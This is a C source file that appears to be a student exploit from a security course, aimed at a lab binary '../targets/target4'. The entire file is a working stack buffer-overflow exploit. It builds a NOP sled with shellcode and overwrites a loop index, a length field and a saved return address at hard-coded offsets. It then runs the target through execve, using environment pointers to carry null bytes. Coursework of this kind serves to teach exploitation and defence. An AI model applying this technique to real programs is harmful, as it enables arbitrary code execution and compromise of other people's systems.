#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

int main(void)
{
  const char NOP = '\x90';
	const char TERMINATOR = '\0';

	const int CHAR_BYTE = 1;
	const int INT_BYTES = 4;

	const int OVERWRITE_I = 0x00000095;
	const int OVERWRITE_LEN = 0x000000A9;

	const int PC_ADDRESS = 0x3021fea8;
	const int RETURN_ADDRESS = 0x3021fdf0;

	const int ADDRESS_OFFSET = PC_ADDRESS - RETURN_ADDRESS;
	const int BUFFER_LENGTH = ADDRESS_OFFSET + INT_BYTES + CHAR_BYTE;
	
	char *	args[3];
	char *	env[7];

	char buf[BUFFER_LENGTH];

	memset(buf, NOP, BUFFER_LENGTH);

	memcpy(buf, shellcode, strlen(shellcode));

  memcpy(buf + 168, &OVERWRITE_I, INT_BYTES);

	memcpy(buf + 172, &OVERWRITE_LEN, INT_BYTES);

	memcpy(buf + ADDRESS_OFFSET, &RETURN_ADDRESS, INT_BYTES);

	buf[BUFFER_LENGTH - 1] = TERMINATOR;

	args[0] = TARGET;
	args[1] = buf;
	args[2] = NULL;

  env[0] = &buf[170];
	env[1] = &buf[171];
	env[2] = &buf[172];
	env[3] = &buf[174];
	env[4] = &buf[175];
	env[5] = &buf[176];
  env[6] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
